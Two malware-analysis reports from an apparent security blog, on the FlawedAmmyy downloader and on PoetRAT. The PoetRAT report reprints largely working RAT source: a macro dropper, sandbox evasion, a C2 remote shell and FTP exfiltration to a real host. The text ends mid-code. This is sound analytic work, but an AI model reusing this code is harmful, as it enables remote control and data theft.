[ { "title": "FlawedAmmyy Rat", "url": "/posts/FlawedAmmyy-Rat/", "categories": "malware-reports", "tags": "malware-unpacking, unpacking", "date": "2021-10-23 14:33:00 +0200", "snippet": "FlawedAmmyy is a remote access Trojan (RAT) which is based on leaked Ammyy Admin software. Ammyy Admin is a popular remote access tool used by businesses and consumers to handle remote control and diagnostics on Microsoft Windows machines which makes the FlawedAmmyy RAT to exhibit the functionality of the leaked version, including remote desktop control, file system manager, proxy support and audio chat.FlawedAmmyy was used in both massive campaigns such as phishing campaigns, to potentially create a large base of compromised computers, as well as targeted campaigns that create opportunities for actors to steal customer data, proprietary information, and more. In the latest campaign of TA505 which is a prolific Cybercriminal group known for attacks against multiple financial institutions and retail companies, they started using HTML attachments to deliver malicious .XLS files that lead to downloader and backdoor FlawedAmmyy, mostly to target South Korean users.Sample InformationSHA256:CB114123CA1C33071CF6241C3E5054A39B6F735D374491DA0B33DFDAA1F7EA22MD5:B635C11EFDF4DC2119FA002F73A9DF7BSample Type Windows Exe (x86-32)Executive SummaryThis malware is just a downloader for the actual encrypted malware toevade detection, it decrypts then executes it, also it enforces somepersistence techniques according to the running environment to make surethat the malware would still be there in victim’s machineInitial assessmentAt Malware initial assessment using Pestudio and DIE (Detect iteasy), it was found that the sample is Windows Exe (x86-32) and ithas (Microsoft Visual C/C++(6.0)) compiler stampBy analyzing the entropy of file sections, it looks like there isappended part on the exe (Overlay) that is packed and indirectlyloaded after the malware is executedUnpackingTo unpack the file, I used Unpac.me online service and it was ableto extract the unpacked childUnpacked Sample basic informationMD5 :71b183a44f755ca170fc2e29b05b64d5SHA1: 67fc3717e0ea134599633e1e7e8daf6cc0857f99ImportsWe can find lots of interesting API calls which is able to manipulateRegistry, Files &amp;amp; Execute processes … etcStringsIf we examine the strings of malware, we can identify a lot of maliciousstrings that give us information about the behavior of the malware andwhat it tries to do on a system.These strings are combination of CMD commands, URL, System Paths, Files.Cmd commands are used to query domain controller and manipulate windowsservices.URL is for a file to be downloaded apparentlyAnd some interested paths and filesDynamic analysis using sandboxUsing any.run service it was found that the malware is querying thedomain controller for the machine, then it deletes itself.Looking at HTTP requests, it tried to download a file but the serverdidn’t respond, so this clarifies why it deleted itself from the systemat the first placeAnalysis part*All functions were renamed by me to easy explanationsThe first variable v18 is calling afunction to get the Major &amp;amp; Minor version of the windows in order toidentify the windows versionThe next 2 functions (EraseTape which is used to erase Tape storage,GetPrinterA retrieves information about a specified printer), Theywere put there for no reason cause 0 is passed in handle argument whichis invalid handle for Tape or Printer. So, we can say that they were putas a distraction.Then the if condition (sub_411260) it executes (net group/domain)* to check the domain name you are inside and check whetherit’s WORKGROUP and returns true if it is, but this if condition isalways TRUE because the OR condition with both return and thecompliment, one of them will be TRUE*https://attack.mitre.org/techniques/T1087/Delete_wsus_exe functionAt first it executes (SHGetSpecialFolderPathA) it retrieves the pathof a special folder, identified by its CSIDL, 0x23 CSIDL refers toCSIDL_COMMON_APPDATA which is the file system directory containingapplication data for all users. Aka (C:\\ProgramData) it appends itthen to both paths shown on image aboveAnd then delete the wsus.exe file, this behavior is associated withremoving previous versions or instances of the malware if it was alreadyrunning.Check_If_Admin function: -This function wasn’t called directly, But it was dynamically resolvedand this how it looked likeAfter tracing inside this functionBy setting a breakpoint on the return of the (sub_401540) andchecking the return value we can find thatIt loaded Shell32_IsUserAnAdminThen it checks whether the malware was executed with an admin privilegeTerminate process functionAs it appears it takes a snapshot of processes already running and loopon them till it find “wsus.exe”, If so, it would terminate itThe three subroutines were resolved using the same method explainedbeforeThen it tries to delete it once moreexec_cmd functionhttps://attack.mitre.org/techniques/T1059/003/This function executes a CMD commands and this one was resolved forshell32_ShellExecuteW and by running this as CMD command “net.exestop foundation” it stops “foundation” service and then it deletesit using “sc delete foundation”Once more it terminates “wsus.exe” if it’s running.It creates then “C:\\ProgramData\\Nugets”Then it resolves the “user32_wsprintfA” by loading the library firstthen the function and setting it to a pointer variable.Then it uses CoCreateGuid to create a unique identifier for thevictimThen it deletes the file “C:\\ProgramData\\Nuggets\\template_??.TMPTMPZIP7” for the purpose ofold instances cleaning ?? refers to the (guid.Part3 + guid.Part1* guid.Part2)Let’s continue with the codeAs we can see file_downloader_write is called and it’s the functionresponsible for downloading the malware, The reference passed to thisfunction as highlighted is the reference for the URLhttp://54.38.127.28/02.datfile_downloader_writeIt loads the lib “wininet.dll” then “InternetReadFile ,InternetOpenA, InternetOpenUrlA” functions were resolved also to visithttp://54.38.127.28/02.dat and download it to “C:\\ProgramData\\Nuggets\\template_??.TMPTMPZIP7”I looked at Shodan to check whether there is any information aboutthis IP address but it seems negativeSo, at this time I needed to emulate the download server, instead ofusing FakeNet I have setup a loopback adapter to redirect thatspecific IP to localhost and configured it’s Ip to 54.38.127.28,Then I used Python SimpleHTTPServer to serve the file.python -m SimpleHTTPServer 80Then the file was opened and handle was passed to “hfile”Then it reads the file content and pass a point to “lpbuffer”It then checks if the file size is more than 4Kb , is so delete theexisted “wsus.exe”Decrypt_File functionThe file downloaded was encrypted to be able to evade antivirusescatching it in the way, So it decrypts it in house to be able to use itThe decryption key used in the function is “Porow2uj548423”Create the decoding array functionThen how is this working?At first it creates an array of length 256 and initiate it withnumbers from [0&amp;gt;255] in sequencea[0] = 0 , a[1] = 1 …… therefore a[j] = j until it loops256 timesv7 += j + dec_key[v8] v6 =ja[j] = a[v7]a[v7]=v6=j therefore a[v7] = jThe variable v8 keeps increasing till it reaches the (secretkey) length then it’s set to 0 again, after it ends, the decodingmatrix constructed from the word should be like the illustration belowDecryption functionAs we can see the length of this array is 256 so in the second functionwhich makes the actual decryption extends the usage &amp;amp; edits it to thefile length to fit, so the current 2 factors affecting the actualencryption XOR key is Downloaded file length &amp;amp; the initial wordpassed into the first functionSub_4126E0v5, v6 , v7 are int8 so their max num is 256 then it overflows andstart from beginningAt first variable v6, v7 are initiated with value 0, thedecryption algorithm loop till it reaches the end of the downloadedfile, noting that variable v7 is increased by one every iteration,simplified pseudo code is shown downside for more illustrationV6+= decoding_arr[v7]V5 = decoding_arr[v7]decoding_arr[v7] = decoding_arr[v6]decoding_arr[v6] = v5 = decoding_arr[v7]EncryptedFile[i] Xor decoding_arr[decoding_arr[v6]+decoding_array[v7]]Returning back to main function analysisThen it checks whether the decryption was done correctly or not bychecking the magic bytes “MZ” on the decrypted file buffer thenchecks for admin privilegesif it’s not admin it will open the file “wsus.exe” and then delete “C:\\ProgramData\\Nuggets\\template_??.TMPTMPZIP7” file Then deletes the file which is executing If it has admin privilege then it will continue to the next function.Persistence functionAt first it resolves “SHGetSpecialFolderPathW” api using its ordinalnumber 175. If the process was opened by admin privileges, then it will useservice persistence techniqueconstructs the previous “wsus.exe” path like before. And it stopsand deletes “foundation” service, and then it creates a service withthe same name and configure it to be started automatically when widowsstarthttps://attack.mitre.org/techniques/T1543/003/ If the process doesn’t have that privilege, then it will addwsus.exe to auto startup registry Create a registry value in“HKCU\\Software\\Microsoft\\windows\\CurrentVersion\\Run” whichmakes the files auto executed on the startupThe entry name will be IntelProtectedhttps://attack.mitre.org/techniques/T1547/001/Then the running file is deleting itself and it ends :)Indicator of compromisesHashes Sample2.exeMD5:B635C11EFDF4DC2119FA002F73A9DF7BSHA1:C35A4DF038B20B9DC3FF14116325B2E36B722F6C Sample2_unpacked.exe MD5:71B183A44F755CA170FC2E29B05B64D5 SHA1:67FC3717E0EA134599633E1E7E8DAF6CC0857F99 Files C:\\ ProgramData\\Nuggets\\template_??.TMPTMPZIP7 C:\\ ProgramData\\Nuggets\\wsus.exe ?? refers to the (guid.Part3 + guid.Part1 * guid.Part2) URL http://54.38.127.28/02.datStartup Registry Path : HKCU\\Software\\Microsoft\\windows\\CurrentVersion\\Run\\Name : IntelProtectedValue : C:\\ProgramData\\wsus.exeServices Foundation service, auto executes this file on startupC:\\ProgramData\\NuGets\\wsus.exe" }, { "title": "PoetRAT", "url": "/posts/PoetRAT-Report/", "categories": "malware-reports", "tags": "dropper, macro, obfuscated-macro, rat, python", "date": "2021-09-25 18:00:00 +0200", "snippet": "Python RAT uses COVID-19 document lures to target Azerbaijan public and private sectors.Azerbaijan government and energy sector likely targeted by an unknown actor.From the energy sector, the actor demonstrates interest in SCADA systems related to wind turbines.Attachments: Malware dropped archive including malicious python scripts (Pw:infected)https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/password%20infected.rarSample InformationSHA256:208EC23C233580DBFC53AAD5655845F7152ADA56DD6A5C780D54E84A9D227407MD5:3AADBF7E527FC1A050E1C97FEA1CBA4DSHA1:2CF055B3EF60582CA72E77BC4693EA306360F611Version: 4Sample Type: Trojan dropper, Remote Administration Tool (RAT)Executive SummaryThis malware is a word document, by opening this document a maliciousscript is executed (Macro VBA script), it drops a malware in your systemwhich connects to the command-and-control server giving it instructionsto be executed in your machine, this malware can be used for variouspurposes, including, but not limited to Information stealing, spying andcapabilities can be leveraged by having another malware executed withoutyour permission.Initial assessmentAt Malware initial assessment using Pestudio, by looking to itsmagic bytes it looks like that this file is not .exe file, by checkingthe file signature “D0 CF 11 E0 A1 B1 1A E1” we can narrow thepossibilities to (doc, xls, ppt) extensionsVirus Total scanAfter virus total scan as it appears that its Microsoft word filebehaves as Downloader &amp;amp; dropper so apparently it has macroDynamic analysis using sandboxUsing any.run service it was found that Microsoft word process isopening 3 CMD to execute python scripts dropped by the document.#Macro extractionBy using ViperMonkey I was able to extract the VBA macrosExtracted VBA macrofrom vb2py.vbfunctions import *from vb2py.vbdebug import *def document_open(): data = String() User = String() bla = String() Coper = Object() ActiveDocument.ActiveWindow.View.ReadingLayout = False ActiveDocument.Unprotect(&#39;securePass&#39;) show() ActiveDocument.Protect(wdAllowOnlyReading, True, &#39;securePass&#39;, False, False) User = &#39;C:\\\\Users\\\\Public&#39; Docer = ActiveDocument.FullName #Copy Shell(&#39;cmd /c copy &#39; + Docer + &#39; &#39; + User + &#39;\\\\docer.doc&#39;, vbHide) deay()(( 4 )) data = bin2var(User + &#39;\\\\docer.doc&#39;) data = Right(data, 7074638) var2bin(User + &#39;\\\\smile.zip&#39;, data) bla = VBA.FileSystem.Dir(User + &#39;\\\\Python37&#39;, vbDirectory) if bla != VBA.Constants.vbNullString: Shell(&#39;cmd /c rmdir /s /q &#39; + User + &#39;\\\\Python37&#39;, vbHide) deay()(( 2 )) #Unzip Unzip(User + &#39;\\\\smile.zip&#39;, User, &#39;Python37&#39;) #Clean Kill(User + &#39;\\\\smile.zip&#39;) Kill(User + &#39;\\\\docer.doc&#39;) #Run Shell(&#39;&quot;&#39; + User + &#39;\\\\Python37\\\\python.exe&#39; + &#39;&quot; &quot;&#39; + User + &#39;\\\\Python37\\\\launcher.py&#39; + &#39;&quot;&#39;, vbHide)def bin2var(filename): f = Integer() #Which alters when it alteration finds, #Or bends with the remover to remove. f = FreeFile() VBFiles.openFile(f, filename, &#39;b&#39;) # VB2PY (UnknownFileMode) &#39;Access&#39;, &#39;Read&#39;, &#39;Lock&#39;, &#39;Write&#39; fn_return_value = Space(FileLen(filename)) Get(f, VBGetMissingArgument(Get, 1), bin2var()) VBFiles.closeFile(f) #O no! it is an ever-fixed mark #That looks on tempests and is never shaken; return fn_return_valuedef var2bin(filename, data): f = Integer() #If this be error and upon me prov&#39;d, #I never writ, nor no man ever lov&#39;d. f = FreeFile() VBFiles.openFile(f, filename, &#39;w&#39;) # VB2PY (UnknownFileMode) &#39;Access&#39;, &#39;Write&#39;, &#39;Lock&#39;, &#39;Write&#39; VBFiles.writeText(f, data) VBFiles.closeFile(f)def Unzip(Fname, DefPath, TarFold): oApp = Object() FileNameFolder = Variant() #Root folder for the new folder. if Right(DefPath, 1) != &#39;\\\\&#39;: DefPath = DefPath + &#39;\\\\&#39; #Create the folder name strDate = Format(Now, &#39; dd-mm-yy h-mm-ss&#39;) FileNameFolder = DefPath + TarFold + &#39;\\\\&#39; #Make the normal folder in DefPath MkDir(FileNameFolder) #Extract the files into the newly created folder oApp = CreateObject(&#39;Shell.Application&#39;) oApp.Namespace(FileNameFolder).CopyHere(oApp.Namespace(Fname).items, 4)def hide(): ActiveDocument.Sections[1].Range.Font.Hidden = False for Section in ActiveDocument.Sections: if Section.Index &amp;gt; 1: Section.Range.Font.Hidden = Truedef show(): ActiveDocument.Sections[1].Range.Font.Hidden = True for Section in ActiveDocument.Sections: if Section.Index &amp;gt; 1: Section.Range.Font.Hidden = Falsedef deay(min): ptr = Variant() ptr = DateAdd(&#39;s&#39;, min, Time()) if ptr &amp;gt; Time(): while not (( Time() &amp;gt; ptr )): pass return fn_return_valueVBA Macro AnalysisAt first it copies the document file to“C:\\Users\\Public\\docer.doc”Then it executes “bin2var” function which extracts the latest“7074638 Bytes” from the document and creates “smile.zip”, Sothis python script can be used to extract the zip file from the documentf = open(&#39;Sample1&#39;, &#39;rb&#39;)content = f.read()zip_file = content[len(content)-7074638:len(content)]z= open(&#39;Sample.zip&#39;,&#39;wb&#39;)z.write(zip_file)f.close()z.close()then it unzips it into “C:\\Users\\Public\\ Python37”, Apparentlythe extracted files are python version 3.7 and some maliciousscripts“affine.py, backer.py, frown.py, launcher.py, smile.py,smile_funs.py”Then it launches the “Launcher.py” scripthttps://attack.mitre.org/techniques/T1059/Malicious scripts analysisLauncher.pyimport shutilimport sysimport timeimport uuidimport smile_funsme = sys.argv[0]fold = me[:me.rfind(&quot;\\\\&quot;) + 1]def police(): smile_funs.run_cmd(&quot;\\&quot;{0}python.exe\\&quot; \\&quot;{0}smile.py\\&quot;&quot;.format(fold), False) time.sleep(5) smile_funs.run_cmd(&quot;\\&quot;{0}python.exe\\&quot; \\&quot;{0}frown.py\\&quot;&quot;.format(fold), False)def crack(): # Crack everything at this point open(fold + &quot;smile.py&quot;, &quot;wb&quot;).write(open(fold + &quot;LICENSE.txt&quot;, &quot;rb&quot;).read()) open(fold + &quot;smile_funs.py&quot;, &quot;wb&quot;).write(open(fold + &quot;LICENSE.txt&quot;, &quot;rb&quot;).read()) open(fold + &quot;frown.py&quot;, &quot;wb&quot;).write(open(fold + &quot;LICENSE.txt&quot;, &quot;rb&quot;).read()) sys.exit(4)def good_disk_size(): # There are no computers with disk size less than 62 return 62 &amp;lt; round(shutil.disk_usage(&quot;/&quot;)[0]) / 2 ** 30if __name__ == &#39;__main__&#39;: if len(sys.argv) == 2: if sys.argv[1] == &quot;police&quot;: police() else: # Sandbox Evasion if not good_disk_size(): crack() sys.exit(0) # Reaching this far means that we are not in a sandbox, Probably d = open(fold + &quot;frown.py&quot;, &quot;r&quot;).read() uu = str(uuid.uuid4()) d = d.replace(&quot;THE_GUID_KEY&quot;, uu) open(fold + &quot;frown.py&quot;, &quot;w&quot;).write(d) open(fold + &quot;.key&quot;, &quot;w+&quot;).write(uu) police()If there are no arguments passed It will check the containing disk size, if it&#39;s less than 64gb then it would be sandbox  If so it activates “crack function”, which destroys the 3scripts (smile.py, smile_funs.py, frown.py) by overwritingtheir contents with (LICENSE.txt) content as an anti-sandboxtechnique. if sandbox check determined that it’s not a sandbox, it willgenerate an “UUID” and replace “THE_GUID_KEY&quot; word in “Frown.py”script with it Then it writes the “THE_GUID_KEY” into “.key” file (It serves as a unique identifier for the victim). Then it fires Police function. Police function It launches both “Smile.py, Frown.py” files. This function is basically launched under two cases, the first one ispassing argument “Police” or continuing the flow of the scriptafter writing “.key” file. Smile.pyimport multiprocessingimport sysfrom colorama import init as c_init, Fore, Stylefrom affine import Affinefrom smile_funs import *c_init()wanted = Truedef communicate(): resp = &quot;&quot; aff = Affine() while resp != &quot;exit&quot;: try: header = f&quot;&quot;&quot;\\n{Fore.RED}{getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ &quot;&quot;&quot; try: it = open(pipe_out, &quot;wb&quot;) it.truncate(0) it.write(aff.encrypt(resp + header)) resp = &quot;&quot; it.close() except Exception as e: it = open(pipe_out, &quot;w+&quot;) it.truncate(0) it.write(aff.encrypt(str(e) + header)) it.close() file_ready() waiting_file() cmd = aff.decrypt(open(pipe_out, &quot;rb&quot;).read()) if len(cmd) &amp;gt; 2 and &quot;$$&quot; == cmd[0:2]: receiver, sender = multiprocessing.Pipe(False) process = multiprocessing.Process(target=work_on_cmd_process, name=cmd[2:], args=(cmd[2:], sender), daemon=True) processes.append({&quot;process&quot;: process, &quot;receiver&quot;: receiver, &quot;data&quot;: &quot;&quot;, &quot;root&quot;: os.getcwd()}) process.start() else: resp = work_on_cmd(cmd) except Exception as e: with open(pipe_out + &quot;BADD&quot;, &quot;w+&quot;) as f: f.write((&quot;\\n\\nBad Error Happened &quot; + str(e) + &quot;\\n\\n\\n\\n&quot; + str(resp))) global wanted if resp == &quot;exit&quot;: wanted = False time.sleep(0.5)def main(): while wanted: communicate() sys.exit(0)if __name__ == &quot;__main__&quot;: main()it executes the communication function whilst the victim is stillwanted, this status means that the victim is still a matter ofinterest.Communicate function: - It sets a header which consists of username + current path as ifit’s a cmd (ex: username\\@pc_name:execution_path$) It writes it in “Abibliophobia23” file which used forinter-scripts communications and writes the response and header onit. It writes 0 in “.ready” and waits for another script(frown.py) to set it, as if it’s a synchronization mechanismto make sure that every script do its job in turns. Start executing the commands stored in “Abibliophobia23” asCMD commands and if the resp was &quot;exit&quot; then will gothrough process of termination and “frown.py” would have beenterminated by then. Frown.pydef recv(size, wait=False): ready = select.select([sock], [], [], 187) if wait: while not ready[0]: if not is_connected(): return False ready = select.select([sock], [], [], 187) if ready[0]: d = sock.recv(size) if not d: raise ConnectionResetError() return d.decode() return Falsedef run_cmd(cmd, wait=True): if not wait: Popen(cmd, shell=True) return &quot;&quot; comm = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE, universal_newlines=True) stdout, stderr = comm.communicate() if not stdout: return str(stderr) return str(stdout)def connect(): global sock while True: try: context = ssl.SSLContext(ssl.PROTOCOL_TLS) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock = context.wrap_socket(s, server_hostname=host) sock.connect((host, port)) sock.send(b&quot;almond&quot;) res = recv(5, True) if &quot;who&quot; in res: sock.send(f&quot;&quot;&quot;{getuser()}@{node()}-{guid}&quot;&quot;&quot;.encode()) res = recv(5, True) if &quot;ice&quot; in res: break except Exception as e: sleep(183)def is_connected(): if not online(): return False try: sock.send(b&#39;\\x00&#39;) return True except: return Falsedef online(): try: socket.setdefaulttimeout(260) socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((&quot;google.com&quot;, 80)) return True except Exception as exp: return Falsedef file_ready(): open(pipe_out + &quot;.ready&quot;, &quot;w+&quot;).write(&#39;1&#39;)def waiting_file(): count = 1000 while open(pipe_out + &quot;.ready&quot;, &quot;r&quot;).read() != &#39;0&#39; and count &amp;gt; 0: sleep(0.5) count -= 1def communicate(): global wanted aff = Affine() try: d = open(pipe_out, &quot;rb&quot;).read() if len(d) == 0: d = &quot;EMPTY&quot; else: d = aff.decrypt(d) sock.send(d.encode()) res = recv(4028, True) it = open(pipe_out, &quot;wb&quot;) if res.rstrip() == &quot;exit&quot;: wanted = False elif res.rstrip() == &quot;dis&quot;: it.close() sys.exit(0) elif res.rstrip() == &quot;##&quot;: while res.rstrip() != &quot;exit&quot;: res = recv(4028, True) sock.send(run_cmd(res.rstrip()).encode()) return it.truncate(0) res = aff.encrypt(res) it.write(res) it.close() file_ready() except ConnectionResetError: sock.close() except Exception as e: if is_connected(): sock.send(&quot;An error has occurred: {}&quot;.format(str(e)).encode())def main(): sleep(83) while wanted: try: waiting_file() if not is_connected(): connect() communicate() except Exception as a: if is_connected(): sock.send(str(a).encode())So basically, how this works? At first it waits 83 secs then it will wait till “smile.py”signals that its first part was already finished and“.ready” is set to 0 it checks whether there is an internet connection on victims’machine checks whether it has an established connection with C&amp;amp;C andconnect if not after it connects it will send the String “almond” if the reply is &quot;who&quot;, it will send the identifier of thevictim it waits for the word “ice” then the connection is good and theC&amp;amp;C server identified the victim successfully. after a successful connection is made there are 4 cases for the reply,if malware received: exit: it means that they are no longer interested in thisvictim and will go through the process of terminating theoperation. dis: disconnect the victim and shutdown the script frown.py. ##: it switches the connection to remote shell like, itexecutes the commands received interactively and reply withthe output until C&amp;amp;C send “exit” then it ends the session. if those cases aren&#39;t met it will write the response intointercommunication file, then it will set “.ready” file to1 signaling the other script that this part was already done toget it continue executing those commands. This process is going to be repeated until “exit, dis” is received.Affine.pyimport base64class Affine(object): DIE = 128 KEY = (7, 3, 55) def __init__(self): pass def encrypt_char(self, char): K1, K2, kI = self.KEY return chr((K1 * ord(str(char)) + K2) % self.DIE) def encrypt(self, string): st = base64.b64encode(string.encode(&quot;utf-8&quot;)).decode() return &quot;&quot;.join(map(self.encrypt_char, st)).encode() def decrypt_char(self, char): K1, K2, KI = self.KEY return chr(KI * (ord(str(char)) - K2) % self.DIE) def decrypt(self, string): try: string = string.decode() except: pass st = &quot;&quot;.join(map(self.decrypt_char, string)) return base64.b64decode(st.encode()).decode(&quot;utf-8&quot;)Affine script is used as encryption/decryption module it’s initializedin all scripts communicating through “Abibliophobia23” file, notingthat all writing/reading this file is always accompanied byencrypting/decrypting function usedSmile_funs.pyimport argparseimport globimport osimport platformimport shleximport shutilimport statimport sysimport timeimport winregimport zipfilefrom ftplib import FTPfrom getpass import getuserfrom random import uniformfrom subprocess import Popen, PIPEimport chardetimport mssfrom tabulate import tabulatefrom affine import AffineRHOST = &quot;dellgenius.hopto.org&quot;me = sys.argv[0]fold = me[:me.rfind(&quot;\\\\&quot;) + 1]pipe_out = fold + &quot;Abibliophobia23&quot;processes = []############ Internal ############class ArgumentParser(argparse.ArgumentParser): def error(self, message): args = {&#39;prog&#39;: self.prog, &#39;message&#39;: message} raise AttributeError(self.format_help() + &#39;\\n%(prog)s: error: %(message)s\\n&#39; % args) def exit(self, status=0, message=None): if message: raise Exception(message) def print_usage(self, file=None): if file is None: raise Exception(self.format_usage()) else: self._print_message(self.format_usage(), file) def print_help(self, file=None): if file is None: raise Exception(self.format_help()) else: self._print_message(self.format_help(), file)def execution(com): args = shlex.split(com) cmd = args[0] args = args[1:] if cmd == &quot;version&quot;: return &quot;4.0&quot; elif cmd == &quot;ls&quot;: return ls(args) elif cmd == &quot;cd&quot;: return chdir(args) elif cmd == &quot;sysinfo&quot;: return get_sys_info() elif cmd == &quot;download&quot;: return download(args) elif cmd == &quot;upload&quot;: return upload_file(args) elif cmd == &quot;shot&quot;: return shot(args) elif cmd == &quot;cp&quot;: return copy_file_a(args) elif cmd == &quot;mv&quot;: return move_file_a(args) elif cmd == &quot;link&quot;: return create_link_a(args) elif cmd == &quot;register&quot;: return register_a(args) elif cmd == &quot;hide&quot;: return hide_file_a(args) elif cmd == &quot;compress&quot;: return compress(args) elif cmd == &quot;jobs&quot;: return jobs(args) elif cmd == &quot;exit&quot;: return &quot;exit&quot; else: return run_cmd(com)[0]def copy_file(p1, p2): if os.path.isfile(p1): shutil.copy2(p1, p2) else: shutil.copytree(p1, p2)def move_file(p1, p2): shutil.move(p1, p2)def hide_file(file): run_cmd(&quot;attrib +h +r +s &quot;.format(file), False)def unhide_file(file): run_cmd(&quot;attrib -h -r -s &quot;.format(file), False)def registry(owner, path, name, value, value_type): key = winreg.CreateKey(owner, path) time.sleep(uniform(5, 20)) winreg.SetValueEx(key, name, 0, value_type, value) time.sleep(uniform(5, 10)) winreg.CloseKey(key)def create_link(p1, p2): os.link(p1, p2)def remove_link(p1): os.unlink(p1)def file_ready(): open(pipe_out + &quot;.ready&quot;, &quot;w+&quot;).write(&#39;0&#39;)def waiting_file(): while open(pipe_out + &quot;.ready&quot;, &quot;r&quot;).read() != &#39;1&#39;: time.sleep(0.5)def init_ftp(username, password, directory): if password is None: aff = Affine() open(pipe_out, &quot;w&quot;).write(aff.encrypt(&quot;Pass?\\n&quot;)) file_ready() waiting_file() password = aff.decrypt(str(open(pipe_out, &quot;r&quot;).read().rstrip())) ftp = FTP(RHOST) ftp.login(username, password) ftp.cwd(directory) return ftpdef ftp_arg_parse(com, source): ap = ArgumentParser(source) if source != &quot;shot&quot;: ap.add_argument(&quot;-f&quot;, action=&quot;store&quot;, required=True, type=str) ap.add_argument(&quot;-u&quot;, action=&quot;store&quot;, type=str, default=&quot;smile&quot;) ap.add_argument(&quot;-p&quot;, action=&quot;store&quot;, type=str, default=None) ap.add_argument(&quot;-d&quot;, action=&quot;store&quot;, type=str, default=&quot;files&quot;) args = vars(ap.parse_args(com)) return argsdef download_file(ftp, resp, file): with open(file, &#39;rb&#39;) as fp: resp += &quot;{}: &quot;.format(file) try: rest_pos = ftp.size(file) except: rest_pos = 0 fp.seek(rest_pos, 0) resp += (ftp.storbinary(&quot;STOR &quot; + file, fp, rest=rest_pos) + &quot;\\n&quot;) return respdef fix_coding(data, new_coding=&quot;utf-8&quot;): if len(data) == 0: return &quot;&quot; encoding = chardet.detect(data)[&#39;encoding&#39;] if new_coding.upper() != encoding.upper(): data = data.decode(encoding) return datadef work_on_cmd_process(command, dick): dick.send(work_on_cmd(command)) dick.close()def work_on_cmd(command): piper = command.split(&quot;|&quot;) com = piper[0].strip() try: resp = execution(com) except Exception as e: resp = str(e) if len(piper) == 1: return resp else: return work_on_cmd(piper[1] + &quot; &quot; + shlex.quote(resp) + &quot;|&quot;.join(piper[2:]))def cut_len(line, m=10): temp = &quot;&quot; for bla in range(int(len(line) / m) + 1): temp += line[bla * m:(bla + 1) * m].strip() + &quot;\\n&quot; return temp if temp != &quot;&quot; else linedef list_processes(): header = [&quot;Name&quot;, &quot;Is Alive?&quot;, &quot;Invoke Dir&quot;] data = [] for x in processes: data.append([cut_len(x[&quot;process&quot;].name, 50), x[&quot;process&quot;].is_alive(), cut_len(x[&quot;root&quot;], 27)]) return tabulate(data, header, stralign=&quot;left&quot;, showindex=&quot;always&quot;, tablefmt=&quot;fancy_grid&quot;)def clear_processes(key): if key is not None: if not processes[key][&quot;process&quot;].is_alive(): processes.pop(key) return &quot;Cleared&quot; else: return &quot;Can&#39;t clear running process&quot; # Actually I can, but should I? else: x = 0 for k in range(len(processes)): if clear_processes(x) != &quot;Cleared&quot;: x += 1 return &quot;Cleared&quot;def output_process(key): px = processes[key] d = px[&quot;receiver&quot;] if d.poll(timeout=1): px[&quot;data&quot;] += d.recv() return px[&quot;data&quot;]def kill_process(key): try: processes[key][&quot;process&quot;].kill() except Exception as e: return &quot;Could not kill him: &quot; + str(e) return &quot;Killed );&quot;def terminate_process(key): try: processes[key][&quot;process&quot;].terminate() except Exception as e: return &quot;Could not terminate him: &quot; + str(e) return &quot;Terminated /:&quot;def close_process(key): try: processes[key][&quot;process&quot;].close() processes.pop(key) except Exception as e: return &quot;Could not close him: &quot; + str(e) return &quot;Closed |:&quot;############ External ############def jobs(com): ap = ArgumentParser(&quot;jobs&quot;) action = ap.add_subparsers(dest=&quot;action&quot;) a_clear = action.add_parser(&quot;clear&quot;) a_output = action.add_parser(&quot;output&quot;) a_kill = action.add_parser(&quot;kill&quot;) a_term = action.add_parser(&quot;terminate&quot;) a_close = action.add_parser(&quot;close&quot;) a_clear.add_argument(&quot;index&quot;, action=&quot;store&quot;, type=int, nargs=&quot;?&quot;) a_clear.set_defaults(act=clear_processes) a_output.add_argument(&quot;index&quot;, action=&quot;store&quot;, type=int) a_output.set_defaults(act=output_process) a_kill.add_argument(&quot;index&quot;, action=&quot;store&quot;, type=int) a_kill.set_defaults(act=kill_process) a_term.add_argument(&quot;index&quot;, action=&quot;store&quot;, type=int) a_term.set_defaults(act=terminate_process) a_close.add_argument(&quot;index&quot;, action=&quot;store&quot;, type=int) a_close.set_defaults(act=close_process) args = vars(ap.parse_args(com)) if args[&quot;action&quot;] is not None: return args[&#39;act&#39;](args[&quot;index&quot;]) else: return list_processes()def ls(com): ap = ArgumentParser(prog=&quot;ls&quot;) ap.add_argument(&quot;i&quot;, action=&quot;store&quot;, type=int, nargs=&quot;?&quot;) args = vars(ap.parse_args(com)) if args[&#39;i&#39;] is not None: return os.listdir(&quot;.&quot;)[int(args[&#39;i&#39;])] else: data = [] header = [&quot;Mode&quot;, &quot;Size&quot;, &quot;Creation&quot;, &quot;Modification&quot;, &quot;Name&quot;] for x in os.listdir(&quot;.&quot;): x_stat = os.stat(x) data.append( [stat.filemode(x_stat.st_mode), x_stat.st_size, cut_len(time.ctime(x_stat.st_ctime), 20), cut_len(time.ctime(x_stat.st_mtime), 20), cut_len(x, 30)]) return tabulate(data, header, stralign=&quot;left&quot;, showindex=&quot;always&quot;, tablefmt=&quot;simple&quot;) + &quot;\\n||| &quot; + os.getcwd() + &quot; ||| &quot;def compress(com): ap = ArgumentParser(prog=&quot;compress&quot;) ap.add_argument(&quot;-d&quot;, action=&quot;store&quot;, type=str, required=True) ap.add_argument(&quot;-t&quot;, action=&quot;store&quot;, type=str, required=True) ap.add_argument(&quot;-c&quot;, action=&quot;store&quot;, type=int, required=False) ap.add_argument(&quot;-l&quot;, action=&quot;store&quot;, type=int, required=False, default=None) args = vars(ap.parse_args(com)) arch = args[&#39;d&#39;] targets = args[&#39;t&#39;].split(&quot;,&quot;) level = args[&#39;l&#39;] with zipfile.ZipFile(arch, &quot;w&quot;) as zipper: for glob_path in targets: for one in glob.iglob(glob_path.lstrip(), recursive=True): if os.path.isdir(one): for folder, subfolder, files in os.walk(one): for x in files: p = os.path.join(folder, x) zipper.write(p, os.path.relpath(p, one + &quot;/..&quot;), compress_type=zipfile.ZIP_LZMA, compresslevel=level) else: zipper.write(one, os.path.relpath(one), compress_type=zipfile.ZIP_LZMA, compresslevel=level) if args[&quot;c&quot;] is None: return &quot;Compressed &quot; + str(os.stat(arch).st_size / 1024 / 1024) + &quot;Mb to &quot; + os.path.abspath(arch) chapters = 